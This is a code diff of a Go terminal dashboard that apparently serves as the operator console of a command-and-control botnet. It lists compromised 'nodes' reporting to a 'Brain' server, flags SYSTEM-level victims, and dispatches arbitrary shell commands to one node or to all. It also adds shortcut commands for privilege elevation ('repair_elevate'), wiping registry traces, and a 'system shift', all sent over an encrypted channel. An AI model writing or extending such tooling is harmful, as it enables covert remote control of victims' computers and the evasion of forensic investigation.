@@ -111,40 +111,66 @@ func setupDashboard() {
 		}
 	}()
 
-	// --- 8. REFRESH ENGINE (Stable) ---
+	// --- 8. REFRESH ENGINE (Identity Aware & Robust) ---
 	go func() {
 		for {
 			t := fetchTargets()
+
 			app.QueueUpdateDraw(func() {
-				currentName := ""
-				if targetList.GetItemCount() > 0 {
-					idx := targetList.GetCurrentItem()
-					if idx >= 0 && idx < targetList.GetItemCount() {
-						currentName, _ = targetList.GetItemText(idx)
-					}
+				// Save current selection index
+				selectedIdx := targetList.GetCurrentItem()
+				var selectedText string
+				if selectedIdx >= 0 && selectedIdx < targetList.GetItemCount() {
+					selectedText, _ = targetList.GetItemText(selectedIdx)
 				}
 
 				targetList.Clear()
 				targetList.AddItem("[ALL_BROADCAST]", "Global Command", 'a', nil)
 
-				newIdx := 0
+				// DEBUG LOG: See if the brain is actually sending data
+				if t == nil {
+					fmt.Fprintf(logView, "[red]%s[-] [white]PING[-] ➔ Brain Unreachable\n", time.Now().Format("15:04:05"))
+					return
+				}
+
+				if len(t) == 0 {
+					fmt.Fprintf(logView, "[yellow]%s[-] [white]PING[-] ➔ 0 Nodes Online\n", time.Now().Format("15:04:05"))
+					return
+				}
+
+				// Populate with logic
+				newSelectionIdx := 0
 				for _, name := range t {
 					if name == "" {
 						continue
 					}
-					displayName := "NODE::" + name
+
+					icon := "👤"
+					color := "[white]"
+
+					if strings.Contains(name, "SYSTEM") {
+						icon = "💀"
+						color = "[red]"
+					} else if strings.Contains(name, "REPAIR") {
+						icon = "🛠️"
+						color = "[yellow]"
+					}
+
+					displayName := fmt.Sprintf("%s %sNODE::%s[-]", icon, color, name)
 					targetList.AddItem(displayName, "Signal Active", 0, nil)
-					if displayName == currentName {
-						newIdx = targetList.GetItemCount() - 1
+
+					// Maintain selection
+					if displayName == selectedText {
+						newSelectionIdx = targetList.GetItemCount() - 1
 					}
 				}
-				targetList.SetCurrentItem(newIdx)
-				fmt.Fprintf(logView, "[orange]%s[-] [white]PING[-] ➔ Brain Ack\n", time.Now().Format("15:04:05"))
+
+				targetList.SetCurrentItem(newSelectionIdx)
+				fmt.Fprintf(logView, "[green]%s[-] [white]PING[-] ➔ %d Nodes Active\n", time.Now().Format("15:04:05"), len(t))
 			})
 			time.Sleep(5 * time.Second)
 		}
 	}()
-
 	// --- 9. INPUT ENGINE ---
 	commandInput.SetDoneFunc(func(key tcell.Key) {
 		if key == tcell.KeyEnter {
@@ -156,16 +182,48 @@ func setupDashboard() {
 				return
 			}
 
+			// 1. EXTRACT THE TARGET ID
+			// We split at "::" to bypass icons (👤, 💀) and color tags
 			idx := targetList.GetCurrentItem()
 			fullText, _ := targetList.GetItemText(idx)
-			targetID := strings.TrimPrefix(fullText, "NODE::")
 
+			var targetID string
+			if strings.Contains(fullText, "::") {
+				parts := strings.Split(fullText, "::")
+				targetID = strings.TrimSpace(parts[1])
+				targetID = strings.TrimSuffix(targetID, "[-]")
+			} else {
+				targetID = strings.TrimPrefix(fullText, "NODE::")
+			}
+
+			// 2. TACTICAL COMMAND INTERCEPTORS
+			// CRITICAL: We 'return' after these to prevent double-execution
+			if cmd == "repair" {
+				fmt.Fprintf(outputView, "[yellow][!] TRIGGERING DIFFERENTIAL REPAIR ON %s...[-]\n", targetID)
+				go executeRotatingCommand(targetID, "repair_elevate")
+				commandInput.SetText("")
+				return
+			}
+			if cmd == "clean" {
+				fmt.Fprintf(outputView, "[blue][✓] PURGING REGISTRY TRACES ON %s...[-]\n", targetID)
+				go executeRotatingCommand(targetID, "purge_traces")
+				commandInput.SetText("")
+				return
+			}
+			if cmd == "shift" {
+				fmt.Fprintf(outputView, "[red][⚡] SYSTEM_SHIFT SENT TO %s...[-]\n", targetID)
+				go executeRotatingCommand(targetID, "shift_system")
+				commandInput.SetText("")
+				return
+			}
 			if cmd == "clear" {
 				outputView.Clear()
 				commandInput.SetText("")
 				return
 			}
 
+			// 3. STANDARD SHELL EXECUTOR
+			// Only runs if the input wasn't a tactical command above
 			ts := time.Now().Format("15:04:05")
 			fmt.Fprintf(outputView, "[white]%s[-] [green][TASK][-] %s ➔ %s\n", ts, targetID, cmd)
 
@@ -175,7 +233,12 @@ func setupDashboard() {
 					broadcastCommand(command)
 				} else {
 					res = executeRotatingCommand(tid, command)
-					fmt.Fprintf(outputView, "[white]%s[-] [blue][RECV][-] %s ➔ \n%s\n", ts, tid, formatResponse(tid, res))
+					// Decryption check: only print if result is valid
+					if !strings.Contains(res, "Decryption Error") {
+						fmt.Fprintf(outputView, "[white]%s[-] [blue][RECV][-] %s ➔ \n%s\n", ts, tid, formatResponse(tid, res))
+					} else {
+						fmt.Fprintf(outputView, "[white]%s[-] [red][FAIL][-] %s ➔ Node connection dropped or busy.\n", ts, tid)
+					}
 				}
 				app.Draw()
 			}(targetID, cmd)
